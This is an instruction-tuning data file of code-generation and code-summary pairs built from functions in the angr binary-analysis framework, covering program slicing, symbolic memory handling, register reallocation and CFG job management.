{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding a slice of the program without considering the effect of data dependencies.", "response": "def _construct_control_flow_slice(self, simruns):\n        \"\"\"\n        Build a slice of the program without considering the effect of data dependencies.\n        This is an incorrect hack, but it should work fine with small programs.\n\n        :param simruns: A list of SimRun targets. You probably wanna get it from the CFG somehow. It must exist in the\n                        CFG.\n        \"\"\"\n\n        # TODO: Support context-sensitivity!\n\n        if self._cfg is None:\n            l.error('Please build CFG first.')\n\n        cfg = self._cfg.graph\n        for simrun in simruns:\n            if simrun not in cfg:\n                l.error('SimRun instance %s is not in the CFG.', simrun)\n\n        stack = [ ]\n        for simrun in simruns:\n            stack.append(simrun)\n\n        self.runs_in_slice = networkx.DiGraph()\n        self.cfg_nodes_in_slice = networkx.DiGraph()\n\n        self.chosen_statements = { }\n        while stack:\n            # Pop one out\n            block = stack.pop()\n            if block.addr not in self.chosen_statements:\n                self.chosen_statements[block.addr] = True\n                # Get all predecessors of that block\n                predecessors = cfg.predecessors(block)\n                for pred in predecessors:\n                    stack.append(pred)\n                    self.cfg_nodes_in_slice.add_edge(pred, block)\n                    self.runs_in_slice.add_edge(pred.addr, block.addr)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a default backward slice from a list of statements.", "response": "def _construct_default(self, targets):\n        \"\"\"\n        Create a backward slice from a specific statement in a specific block. This is done by traverse the CFG\n        backwards, and mark all tainted statements based on dependence graphs (CDG and DDG) provided initially. The\n        traversal terminated when we reach the entry point, or when there is no unresolved dependencies.\n\n        :param targets: A list of tuples like (cfg_node, stmt_idx), where cfg_node is a CFGNode instance where the\n                        backward slice starts, and it must be included in CFG and CDG. stmt_idx is the ID of the target\n                        statement where the backward slice starts.\n        \"\"\"\n\n        # TODO: Support context-sensitivity\n\n        l.debug(\"Constructing a default backward program slice\")\n\n        self.taint_graph = networkx.DiGraph()\n\n        taints = set()\n        accessed_taints = set()\n\n        # Fill in the taint set\n\n        for cfg_node, stmt_idx in targets:\n            if cfg_node not in self._cfg.graph:\n                raise AngrBackwardSlicingError('Target CFGNode %s is not in the CFG.' % cfg_node)\n\n            if stmt_idx == -1:\n                new_taints = self._handle_control_dependence(cfg_node)\n                taints |= new_taints\n\n            else:\n                cl = CodeLocation(cfg_node.addr, stmt_idx)\n                taints.add(cl)\n\n        while taints:\n            # Pop a tainted code location\n            tainted_cl = taints.pop()\n\n            l.debug(\"Checking taint %s...\", tainted_cl)\n\n            # Mark it as picked\n            if tainted_cl.block_addr is not None and tainted_cl.stmt_idx is not None:\n                # Skip SimProcedures\n                self._pick_statement(tainted_cl.block_addr, tainted_cl.stmt_idx)\n\n            # Mark it as accessed\n            accessed_taints.add(tainted_cl)\n\n            # Pick all its data dependencies from data dependency graph\n            if self._ddg is not None and tainted_cl in self._ddg:\n                if isinstance(self._ddg, networkx.DiGraph):\n                    predecessors = list(self._ddg.predecessors(tainted_cl))\n                else:\n                    # angr.analyses.DDG\n                    predecessors = list(self._ddg.get_predecessors(tainted_cl))\n                l.debug(\"Returned %d predecessors for %s from data dependence graph\", len(predecessors), tainted_cl)\n\n                for p in predecessors:\n                    if p not in accessed_taints:\n                        taints.add(p)\n\n                    self.taint_graph.add_edge(p, tainted_cl)\n\n            # Handle the control dependence\n            for n in self._cfg.get_all_nodes(tainted_cl.block_addr):\n                new_taints = self._handle_control_dependence(n)\n\n                l.debug(\"Returned %d taints for %s from control dependence graph\", len(new_taints), n)\n\n                for taint in new_taints:\n                    if taint not in accessed_taints:\n                        taints.add(taint)\n\n                    self.taint_graph.add_edge(taint, tainted_cl)\n\n        # In the end, map the taint graph onto CFG\n        self._map_to_cfg()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _find_exits(self, src_block, target_block):\n\n        # Enumerate all statements and find exit statements\n        # Since we don't have a state, we have to rely on the pyvex block instead of SimIRSB\n        # Just create the block from pyvex again - not a big deal\n\n        if self.project.is_hooked(src_block.addr):\n            # Just return all exits for now\n            return { -1: [ target_block.addr ] }\n\n        block = self.project.factory.block(src_block.addr)\n        vex_block = block.vex\n\n        exit_stmt_ids = { }\n\n        for stmt_idx, stmt in enumerate(vex_block.statements):\n            if isinstance(stmt, pyvex.IRStmt.Exit):\n                exit_stmt_ids[stmt_idx] = None\n\n        # And of course, it has a default exit\n        # Don't forget about it.\n        exit_stmt_ids[DEFAULT_STATEMENT] = None\n\n        # Find all paths from src_block to target_block\n        # FIXME: This is some crappy code written in a hurry. Replace the all_simple_paths() later.\n        all_simple_paths = list(networkx.all_simple_paths(self._cfg.graph, src_block, target_block, cutoff=3))\n\n        for simple_path in all_simple_paths:\n            if len(simple_path) <= 1:\n                # Oops, it looks that src_block and target_block are the same guy?\n                continue\n\n            if self._same_function:\n                # Examine this path and make sure it does not have call or return edge\n                for i in range(len(simple_path) - 1):\n                    jumpkind = self._cfg.graph[simple_path[i]][simple_path[i + 1]]['jumpkind']\n                    if jumpkind in ('Ijk_Call', 'Ijk_Ret'):\n                        return {  }\n\n            # Get the first two nodes\n            a, b = simple_path[0], simple_path[1]\n            # Get the exit statement ID from CFG\n            exit_stmt_id = self._cfg.get_exit_stmt_idx(a, b)\n            if exit_stmt_id is None:\n                continue\n\n            # Mark it!\n            if exit_stmt_ids[exit_stmt_id] is None:\n                exit_stmt_ids[exit_stmt_id] = [ b.addr ]\n            else:\n                exit_stmt_ids[exit_stmt_id].append(b.addr)\n\n        return exit_stmt_ids", "response": "Find all exit statements that lead to the target block."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbases on control dependence graph, pick all exits (statements) that lead to the target. :param target_node: A CFGNode instance. :returns: A set of new tainted code locations.", "response": "def _handle_control_dependence(self, target_node):\n        \"\"\"\n        Based on control dependence graph, pick all exits (statements) that lead to the target.\n\n        :param target_node: A CFGNode instance.\n        :returns:           A set of new tainted code locations.\n        \"\"\"\n\n        new_taints = set()\n\n        # Query the CDG and figure out all control flow transitions to reach this target\n        cdg_guardians = self._cdg.get_guardians(target_node)\n        if not cdg_guardians:\n            # this block is directly reachable from the entry point\n            pass\n\n        else:\n            # For each predecessor on CDG, find the correct exit to take, and continue slicing from those exits\n            for predecessor in cdg_guardians:\n                exits = self._find_exits(predecessor, target_node)\n\n                for stmt_idx, target_addresses in exits.items():\n                    if stmt_idx is not None:\n                        # If it's an exit statement, mark it as picked\n                        self._pick_statement(predecessor.addr,\n                                             self._normalize_stmt_idx(predecessor.addr, stmt_idx)\n                                             )\n                        # If it's the default statement, we should also pick other conditional exit statements\n                        if stmt_idx == DEFAULT_STATEMENT:\n                            conditional_exits = self._conditional_exits(predecessor.addr)\n                            for conditional_exit_stmt_id in conditional_exits:\n                                cl = CodeLocation(predecessor.addr,\n                                                  self._normalize_stmt_idx(predecessor.addr, conditional_exit_stmt_id)\n                                                  )\n                                new_taints.add(cl)\n\n                                self._pick_statement(predecessor.addr,\n                                                     self._normalize_stmt_idx(predecessor.addr, conditional_exit_stmt_id)\n                                                     )\n\n                    if target_addresses is not None:\n\n                        if stmt_idx is not None:\n                            # If it's an exit statement, we create a new tainted code location\n                            cl = CodeLocation(predecessor.addr,\n                                              self._normalize_stmt_idx(predecessor.addr, stmt_idx)\n                                              )\n                            new_taints.add(cl)\n\n                        # Mark those exits as picked\n                        for target_address in target_addresses:\n                            self._pick_exit(predecessor.addr, stmt_idx, target_address)\n\n                    # On CFG, pick default exits of all nodes between predecessor and our target node\n                    # Usually this is not required if basic blocks strictly end at control flow transitions. But this is\n                    # not always the case for some architectures\n                    all_simple_paths = list(networkx.all_simple_paths(self._cfg.graph, predecessor, target_node, cutoff=3))\n\n                    previous_node = None\n                    for path in all_simple_paths:\n                        for node in path:\n                            self._pick_statement(node.addr,\n                                                 self._normalize_stmt_idx(node.addr, DEFAULT_STATEMENT))\n                            if previous_node is not None:\n                                self._pick_exit(previous_node.addr, DEFAULT_STATEMENT, node.addr)\n\n        return new_taints"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nmaps our current slice to CFG.", "response": "def _map_to_cfg(self):\n        \"\"\"\n        Map our current slice to CFG.\n\n        Based on self._statements_per_run and self._exit_statements_per_run, this method will traverse the CFG and\n        check if there is any missing block on the path. If there is, the default exit of that missing block will be\n        included in the slice. This is because Slicecutor cannot skip individual basic blocks along a path.\n        \"\"\"\n\n        exit_statements_per_run = self.chosen_exits\n        new_exit_statements_per_run = defaultdict(list)\n\n        while len(exit_statements_per_run):\n            for block_address, exits in exit_statements_per_run.items():\n                for stmt_idx, exit_target in exits:\n                    if exit_target not in self.chosen_exits:\n                        # Oh we found one!\n                        # The default exit should be taken no matter where it leads to\n                        # Add it to the new set\n                        tpl = (DEFAULT_STATEMENT, None)\n                        if tpl not in new_exit_statements_per_run[exit_target]:\n                            new_exit_statements_per_run[exit_target].append(tpl)\n\n            # Add the new ones to our global dict\n            for block_address, exits in new_exit_statements_per_run.items():\n                for ex in exits:\n                    if ex not in self.chosen_exits[block_address]:\n                        self.chosen_exits[block_address].append(ex)\n\n            # Switch them so we can process the new set\n            exit_statements_per_run = new_exit_statements_per_run\n            new_exit_statements_per_run = defaultdict(list)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\npicking a statement in the final slice.", "response": "def _pick_statement(self, block_address, stmt_idx):\n        \"\"\"\n        Include a statement in the final slice.\n\n        :param int block_address:   Address of the basic block.\n        :param int stmt_idx:        Statement ID.\n        \"\"\"\n\n        # TODO: Support context-sensitivity\n\n        # Sanity check\n        if not isinstance(block_address, int):\n            raise AngrBackwardSlicingError(\"Invalid block address %s.\" % block_address)\n        if not isinstance(stmt_idx, int):\n            raise AngrBackwardSlicingError(\"Invalid statement ID %s.\" % stmt_idx)\n\n        self.chosen_statements[block_address].add(stmt_idx)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\npick an exit from the final slice.", "response": "def _pick_exit(self, block_address, stmt_idx, target_ips):\n        \"\"\"\n        Include an exit in the final slice.\n\n        :param block_address:   Address of the basic block.\n        :param stmt_idx:        ID of the exit statement.\n        :param target_ips:      The target address of this exit statement.\n        \"\"\"\n\n        # TODO: Support context-sensitivity\n\n        tpl = (stmt_idx, target_ips)\n        if tpl not in self.chosen_exits[block_address]:\n            self.chosen_exits[block_address].append(tpl)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _conditional_exits(self, block_addr):\n\n        vex_block = self.project.factory.block(block_addr).vex\n        lst = [ ]\n\n        for i, stmt in enumerate(vex_block.statements):\n            if isinstance(stmt, pyvex.IRStmt.Exit):\n                lst.append(i)\n\n        return lst", "response": "Return a list of conditional statements with respect to a basic block."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _normalize_stmt_idx(self, block_addr, stmt_idx):\n\n        if type(stmt_idx) is int:\n            return stmt_idx\n\n        if stmt_idx == DEFAULT_STATEMENT:\n            vex_block = self.project.factory.block(block_addr).vex\n            return len(vex_block.statements)\n\n        raise AngrBackwardSlicingError('Unsupported statement ID \"%s\"' % stmt_idx)", "response": "Normalizes the statement ID."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _last_branching_statement(statements):\n        cmp_stmt_id = None\n        cmp_tmp_id = None\n        total_stmts = len(statements)\n        statements = reversed(statements)\n        for stmt_rev_idx, stmt in enumerate(statements):\n            if isinstance(stmt, pyvex.IRStmt.Exit):\n                stmt_idx = total_stmts - stmt_rev_idx - 1\n                cmp_stmt_id = stmt_idx\n                cmp_tmp_id = stmt.guard.tmp\n\n        return cmp_stmt_id, cmp_tmp_id", "response": "Search for the last branching exit and taint the temp variable inside if predicate\n        is True"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the address of the methods basic block that contains the given instruction.", "response": "def _get_bb_addr_from_instr(self, instr):\n        \"\"\"\n        Returns the address of the methods basic block that contains the given\n        instruction.\n\n        :param instr: The index of the instruction (within the current method).\n        :rtype: SootAddressDescriptor\n        \"\"\"\n        current_method = self.state.addr.method\n        try:\n            bb = current_method.block_by_label[instr]\n        except KeyError:\n            l.error(\"Possible jump to a non-existing bb %s --> %d\",\n                    self.state.addr, instr)\n            raise IncorrectLocationException()\n\n        return SootAddressDescriptor(current_method, bb.idx, 0)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntranslate an address into a value.", "response": "def _translate_addr(self, a): #pylint:disable=no-self-use\n        \"\"\"\n        Resolves this address.\n        \"\"\"\n        if isinstance(a, claripy.ast.Base) and not a.singlevalued:\n            raise SimFastMemoryError(\"address not supported\")\n        return self.state.solver.eval(a)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks whether this size can be supported by FastMemory.", "response": "def _translate_size(self, s): #pylint:disable=no-self-use\n        \"\"\"\n        Checks whether this size can be supported by FastMemory.\"\n        \"\"\"\n        if isinstance(s, claripy.ast.Base) and not s.singlevalued:\n            raise SimFastMemoryError(\"size not supported\")\n        if s is None:\n            return s\n        return self.state.solver.eval(s)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _translate_cond(self, c): #pylint:disable=no-self-use\n        if isinstance(c, claripy.ast.Base) and not c.singlevalued:\n            raise SimFastMemoryError(\"size not supported\")\n        if c is None:\n            return True\n        else:\n            return self.state.solver.eval_upto(c, 1)[0]", "response": "Checks whether this condition can be supported by FastMemory."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nresolve a memory access of a certain size. Returns a sequence of bases offsets and sizes of the accesses required by this module.", "response": "def _resolve_access(self, addr, size):\n        \"\"\"\n        Resolves a memory access of a certain size. Returns a sequence of the bases, offsets, and sizes of the accesses required\n        to fulfil this.\n        \"\"\"\n\n        # if we fit in one word\n        first_offset = addr % self.width\n        first_base = addr - first_offset\n        if first_offset + size <= self.width:\n            return [ (first_base, first_offset, size) ]\n\n        last_size = (addr + size) % self.width\n        last_base = addr + size - last_size\n\n        accesses = [ ]\n        accesses.append((first_base, first_offset, self.width - first_offset))\n        accesses.extend((a, 0, self.width) for a in range(first_base+self.width, last_base, self.width))\n        if last_size != 0:\n            accesses.append((last_base, 0, last_size))\n\n        return accesses"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nperforms a single load of a single object.", "response": "def _single_load(self, addr, offset, size, inspect=True, events=True):\n        \"\"\"\n        Performs a single load.\n        \"\"\"\n        try:\n            d = self._contents[addr]\n        except KeyError:\n            d = self._handle_uninitialized_read(addr, inspect=inspect, events=events)\n            self._contents[addr] = d\n\n        if offset == 0 and size == self.width:\n            return d\n        else:\n            return d.get_bytes(offset, size)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _single_store(self, addr, offset, size, data):\n\n        if offset == 0 and size == self.width:\n            self._contents[addr] = data\n        elif offset == 0:\n            cur = self._single_load(addr, size, self.width - size)\n            self._contents[addr] = data.concat(cur)\n        elif offset + size == self.width:\n            cur = self._single_load(addr, 0, offset)\n            self._contents[addr] = cur.concat(data)\n        else:\n            cur = self._single_load(addr, 0, self.width)\n            start = cur.get_bytes(0, offset)\n            end = cur.get_bytes(offset+size, self.width-offset-size)\n            self._contents[addr] = start.concat(data, end)", "response": "Performs a single store."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the set of bytes that have been changed between self and other.", "response": "def changed_bytes(self, other):\n        \"\"\"\n        Gets the set of changed bytes between self and other.\n        \"\"\"\n\n        changes = set()\n\n        l.warning(\"FastMemory.changed_bytes(): This implementation is very slow and only for debug purposes.\")\n        for addr,v in self._contents.items():\n            for i in range(self.width):\n                other_byte = other.load(addr+i, 1)\n                our_byte = v.get_byte(i)\n                if other_byte is our_byte:\n                    changes.add(addr+i)\n\n        return changes"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _register_reallocation(self, function, data_graph):\n\n        # make sure this function does not call other functions\n        if function.callout_sites:\n            return\n\n        if len(function.endpoints) != 1:\n            return\n\n        # identify function prologue and epilogue\n        startpoint_block = self.project.factory.block(function.startpoint.addr).capstone\n        startpoint_insns = startpoint_block.insns\n\n        # supported function prologues:\n        #\n        # push  ebp\n        # mov   ebp, esp\n        # sub   esp, [0-9a-f]+h\n        #\n        # push  ebp\n        # mov   ebp, esp\n        # push  eax\n\n        if len(startpoint_insns) < 3:\n            return\n\n        insn0, insn1, insn2 = startpoint_insns[:3]\n\n        if not (insn0.mnemonic == 'push' and insn0.op_str == 'ebp'):\n            return\n        if not (insn1.mnemonic == 'mov' and insn1.op_str == 'ebp, esp'):\n            return\n        if not (insn2.mnemonic == 'sub' and re.match(r\"esp, [0-9a-fx]+\", insn2.op_str)) and \\\n                not (insn2.mnemonic == 'push' and insn2.op_str == 'eax'):\n            return\n\n\n        endpoint_block = self.project.factory.block(function.endpoints[0].addr).capstone\n        endpoint_insns = endpoint_block.insns\n\n        # supported function epilogues:\n        #\n        # add   esp, [0-9a-f]+h\n        # pop   ebp\n        # ret\n\n        if len(endpoint_insns) < 3:\n            return\n\n        insn3, insn4, insn5 = endpoint_insns[-3:]\n\n        if not (insn3.mnemonic == 'add' and re.match(r\"esp, [0-9a-fx]+\", insn3.op_str)):\n            return\n        if not (insn4.mnemonic == 'pop' and insn4.op_str == 'ebp'):\n            return\n        if not insn5.mnemonic == 'ret':\n            return\n\n        # make sure esp is not used anywhere else - all stack variables must be indexed using ebp\n        esp_offset = self.project.arch.registers['esp'][0]\n        ebp_offset = self.project.arch.registers['ebp'][0]\n        esp_variables = [ ]\n        for n in data_graph.nodes():\n            if isinstance(n.variable, SimRegisterVariable) and n.variable.reg == esp_offset:\n                esp_variables.append(n)\n\n        # find out all call instructions\n        call_insns = set()\n        for src, dst, data in function.transition_graph.edges(data=True):\n            if 'type' in data and data['type'] == 'call':\n                src_block = function._get_block(src.addr)\n                call_insns.add(src_block.instruction_addrs[-1])\n\n        # there should be six esp variables + all call sites\n        # push ebp (insn0 - read, insn0 - write) ; sub esp, 0xXX (insn2) ;\n        # add esp, 0xXX (insn3) ; pop ebp (insn4) ; ret (insn5)\n\n        esp_insns = set( n.location.ins_addr for n in esp_variables )\n        if esp_insns != { insn0.address, insn2.address, insn3.address, insn4.address, insn5.address } | call_insns:\n            return\n\n        prologue_addr = insn0.address\n        prologue_size = insn0.size + insn1.size + insn2.size\n        epilogue_addr = insn3.address\n        epilogue_size = insn3.size + insn4.size + insn5.size\n\n        # look at consumer of those esp variables. no other instruction should be consuming them\n        # esp_consumer_insns = { insn0.address, insn1.address, insn2.address, insn3.address, insn4.address,\n        #                        insn5.address} | esp_insns\n        # for esp_variable in esp_variables:  # type: angr.analyses.ddg.ProgramVariable\n        #     consumers = data_graph.successors(esp_variable)\n        #     if any([ consumer.location.ins_addr not in esp_consumer_insns for consumer in consumers ]):\n        #         return\n\n        # make sure we never gets the address of those stack variables into any register\n        # say, lea edx, [ebp-0x4] is forbidden\n        # check all edges in data graph\n        for src, dst, data in data_graph.edges(data=True):\n            if isinstance(dst.variable, SimRegisterVariable) and \\\n                    dst.variable.reg != ebp_offset and \\\n                    dst.variable.reg < 40:\n                #to a register other than ebp\n                if isinstance(src.variable, SimRegisterVariable) and \\\n                        src.variable.reg == ebp_offset:\n                    # from ebp\n                    l.debug(\"Found a lea operation from ebp at %#x. Function %s cannot be optimized.\",\n                            dst.location.ins_addr,\n                            repr(function),\n                            )\n                    return\n\n        # we definitely don't want to mess with fp or sse operations\n        for node in data_graph.nodes():\n            if isinstance(node.variable, SimRegisterVariable) and \\\n                    72 <= node.variable.reg < 288:  # offset(mm0) <= node.variable.reg < offset(cs)\n                l.debug('Found a float-point/SSE register access at %#x. Function %s cannot be optimized.',\n                        node.location.ins_addr,\n                        repr(function)\n                        )\n                return\n\n        l.debug(\"RegisterReallocation: function %s satisfies the criteria.\", repr(function))\n\n        # nice. let's see if we can optimize this function\n        # do we have free registers?\n\n        used_general_registers = set()\n        for n in data_graph.nodes():\n            if isinstance(n.variable, SimRegisterVariable):\n                if n.variable.reg < 40:  # this is a hardcoded limit - we only care about general registers\n                    used_general_registers.add(n.variable.reg)\n        registers = self.project.arch.registers\n        all_general_registers = { #registers['eax'][0], registers['ecx'][0], registers['edx'][0],\n                                  registers['ebx'][0], registers['edi'][0], registers['esi'][0],\n                                  registers['esp'][0], registers['ebp'][0]\n                                  }\n        unused_general_registers = all_general_registers - used_general_registers\n\n        if not unused_general_registers:\n            l.debug(\"RegisterReallocation: function %s does not have any free register.\", repr(function))\n            return\n        l.debug(\"RegisterReallocation: function %s has %d free register(s): %s\",\n                repr(function),\n                len(unused_general_registers),\n                \", \".join([self.project.arch.register_names[u] for u in unused_general_registers ])\n                )\n\n        # find local stack variables of size 4\n        stack_variables = set()\n        for n in data_graph.nodes():\n            if isinstance(n.variable, SimStackVariable) and \\\n                    n.variable.base == 'bp' and \\\n                    n.variable.size == 4 and \\\n                    n.variable.offset < 0:\n                stack_variables.add(n)\n\n        # alright, now we need to make sure that stack variables are never accessed by indexes\n        # in other words, they must be accessed directly in forms of 'dword ptr [ebp+x]'\n        # it's easy to do this: we get mem_addr predecessors of each stack variable, and make sure there are only two of\n        # them: one is ebp, the other one is a constant\n        #\n        # ah, also, since we do not want to mess with crazy fp registers, we further require none of the stack variable\n        # sources and consumers is a FP register.\n\n        filtered_stack_variables = set()\n        for stack_variable in stack_variables:\n\n            failed = False\n\n            # check how they are accessed\n            in_edges = data_graph.in_edges(stack_variable, data=True)\n            for src, _, data in in_edges:\n                if 'type' in data and data['type'] == 'mem_addr':\n                    if isinstance(src.variable, SimRegisterVariable) and src.variable.reg == ebp_offset:\n                        # ebp\n                        pass\n                    elif isinstance(src.variable, SimConstantVariable):\n                        # the constant\n                        pass\n                    else:\n                        # ouch\n                        failed = True\n                        break\n\n                if isinstance(src.variable, SimRegisterVariable) and src.variable.reg >= 72:\n                    # it comes from a FP register\n                    failed = True\n                    break\n\n            if failed:\n                continue\n\n            # check consumers\n            out_edges = data_graph.out_edges(stack_variable, data=True)\n            for _, dst, data in out_edges:\n                if 'type' in data and data['type'] == 'kill':\n                    continue\n                if isinstance(dst.variable, SimRegisterVariable) and dst.variable.reg >= 72:\n                    # an FP register is the consumer\n                    failed = True\n                    break\n\n            if failed:\n                continue\n\n            filtered_stack_variables.add(stack_variable)\n\n        # order the stack variables by the sum of their in and out degrees.\n        stack_variable_to_degree = defaultdict(int)\n        stack_variable_sources = defaultdict(list)\n        for sv in filtered_stack_variables:\n            stack_variable_to_degree[sv.variable] += data_graph.in_degree(sv)\n            stack_variable_to_degree[sv.variable] += data_graph.out_degree(sv)\n            stack_variable_sources[sv.variable].append(sv)\n\n        sorted_stack_variables = sorted(stack_variable_to_degree.keys(),\n                                       key=lambda sv: stack_variable_to_degree[sv],\n                                       reverse=True\n                                       )\n\n        # aha these are the ones that we can replace!\n        for reg, sv in zip(unused_general_registers, sorted_stack_variables):\n\n            non_initial_sources = [src for src in stack_variable_sources[sv] if not src.initial]\n\n            if not non_initial_sources:\n                # we failed to find any source for it, which indicates a failure in our dependence analysis\n                # skip\n                continue\n\n            # get consumers\n            consumers = set()\n            for src in stack_variable_sources[sv]:\n                out_edges = data_graph.out_edges(src, data=True)\n                for _, dst, data in out_edges:\n                    if 'type' not in data or data['type'] != 'kill':\n                        consumers.add(dst)\n\n            rr = RegisterReallocation(sv, SimRegisterVariable(reg, 4), non_initial_sources,\n                                      list(consumers), prologue_addr, prologue_size, epilogue_addr, epilogue_size\n                                      )\n            self.register_reallocations.append(rr)\n\n            l.debug(\"RegisterReallocation: %s will replace %s in function %s.\",\n                    rr.register_variable,\n                    rr.stack_variable,\n                    repr(function)\n                    )", "response": "This method is used to register reallocation of a function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nremove assignments to registers that have no consumers but immediately killed.", "response": "def _dead_assignment_elimination(self, function, data_graph):  #pylint:disable=unused-argument\n        \"\"\"\n        Remove assignments to registers that has no consumers, but immediately killed.\n\n        BROKEN - DO NOT USE IT\n\n        :param angr.knowledge.Function function:\n        :param networkx.MultiDiGraph data_graph:\n        :return: None\n        \"\"\"\n\n        register_pvs = set()\n        for node in data_graph.nodes():\n            if isinstance(node.variable, SimRegisterVariable) and \\\n                    node.variable.reg is not None and \\\n                    node.variable.reg < 40:\n                register_pvs.add(node)\n\n        for reg in register_pvs:\n            # does it have a consumer?\n            out_edges = data_graph.out_edges(reg, data=True)\n            consumers = [ ]\n            killers = [ ]\n            for _, _, data in out_edges:\n                if 'type' in data and data['type'] == 'kill':\n                    killers.append(data)\n                else:\n                    consumers.append(data)\n\n            if not consumers and killers:\n                # we can remove the assignment!\n                da = DeadAssignment(reg)\n                self.dead_assignments.append(da)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef initialize_segment_register_x64(self, state, concrete_target):\n        _l.debug(\"Synchronizing gs segment register\")\n        state.regs.gs = self._read_gs_register_x64(concrete_target)", "response": "Initialize the gs register in the angr to the value of the fs register in the concrete target."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef initialize_gdt_x86(self, state, concrete_target):\n        _l.debug(\"Creating Global Descriptor Table and synchronizing fs segment register\")\n        fs = self._read_fs_register_x86(concrete_target)\n        gdt = self.generate_gdt(fs,0x0)\n        self.setup_gdt(state,gdt)\n        return gdt", "response": "Create a Global Descriptor Table in the state memory and populate the segment registers."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_new_reference(self, obj, global_ref=False):\n        # get an unique address\n        opaque_ref = self.state.project.loader.extern_object.allocate()\n        # map the object to that address\n        l.debug(\"Map %s to opaque reference 0x%x\", obj, opaque_ref)\n        if global_ref:\n            self.global_refs[opaque_ref] = obj\n        else:\n            self.local_refs[opaque_ref] = obj\n        return opaque_ref", "response": "Create a new reference that maps to the given object."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndeletes the stored mapping of a reference.", "response": "def delete_reference(self, opaque_ref, global_ref=False):\n        \"\"\"\n        Delete the stored mapping of a reference.\n\n        :param opaque_ref:       Reference which should be removed.\n        :param bool global_ref:  Whether opaque_ref is a local or global\n                                 reference.\n        \"\"\"\n        opaque_ref_value = self._get_reference_value(opaque_ref)\n        if global_ref:\n            del self.global_refs[opaque_ref_value]\n        else:\n            del self.local_refs[opaque_ref_value]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef pop_job(self, returning=True):\n\n        if not self:\n            return None\n\n        if not returning:\n            return self._pop_job(next(reversed(self._jobs.keys())))\n\n        # Prioritize returning functions\n        for func_addr in reversed(self._jobs.keys()):\n            if func_addr not in self._returning_functions:\n                continue\n            return self._pop_job(func_addr)\n\n        return None", "response": "Pops a pending job from the pending jobs list."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves all pending exit and remove all functions that are not returning.", "response": "def cleanup(self):\n        \"\"\"\n        Remove those pending exits if:\n        a) they are the return exits of non-returning SimProcedures\n        b) they are the return exits of non-returning syscalls\n        b) they are the return exits of non-returning functions\n\n        :return: None\n        \"\"\"\n\n        pending_exits_to_remove = defaultdict(list)\n\n        for func_addr in self._updated_functions:\n            if func_addr not in self._jobs:\n                continue\n            jobs = self._jobs[func_addr]\n            for i, pe in enumerate(jobs):\n                if pe.returning_source is None:\n                    # The original call failed. This pending exit must be followed.\n                    continue\n\n                func = self._functions.function(pe.returning_source)\n                if func is None:\n                    # Why does it happen?\n                    l.warning(\"An expected function at %s is not found. Please report it to Fish.\",\n                              pe.returning_source if pe.returning_source is not None else 'None')\n                    continue\n\n                if func.returning is False:\n                    # Oops, it's not returning\n                    # Remove this pending exit\n                    pending_exits_to_remove[pe.returning_source].append(i)\n\n        for func_addr, indices in pending_exits_to_remove.items():\n            jobs = self._jobs[func_addr]\n            for index in reversed(indices):\n                job = jobs[index]\n                self._deregister_job_callback(job.func_addr, job)\n                del jobs[index]\n                self._job_count -= 1\n            if not jobs:\n                del self._jobs[func_addr]\n\n        self.clear_updated_functions()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a function to the returning list.", "response": "def add_returning_function(self, func_addr):\n        \"\"\"\n        Mark a function as returning.\n\n        :param int func_addr: Address of the function that returns.\n        :return:              None\n        \"\"\"\n\n        self._returning_functions.add(func_addr)\n        self._updated_functions.add(func_addr)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _calc_entropy(data, size=None):\n\n        if not data:\n            return 0\n        entropy = 0\n        if size is None:\n            size = len(data)\n\n        data = bytes(pyvex.ffi.buffer(data, size))\n        for x in range(0, 256):\n            p_x = float(data.count(x)) / size\n            if p_x > 0:\n                entropy += - p_x * math.log(p_x, 2)\n        return entropy", "response": "Calculate the entropy of a piece of data."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if the given address is inside one of the memory regions.", "response": "def _inside_regions(self, address):\n        \"\"\"\n        Check if the address is inside any existing region.\n\n        :param int address: Address to check.\n        :return:            True if the address is within one of the memory regions, False otherwise.\n        :rtype:             bool\n        \"\"\"\n\n        try:\n            start_addr = next(self._regions.irange(maximum=address, reverse=True))\n        except StopIteration:\n            return False\n        else:\n            return address < self._regions[start_addr]"}
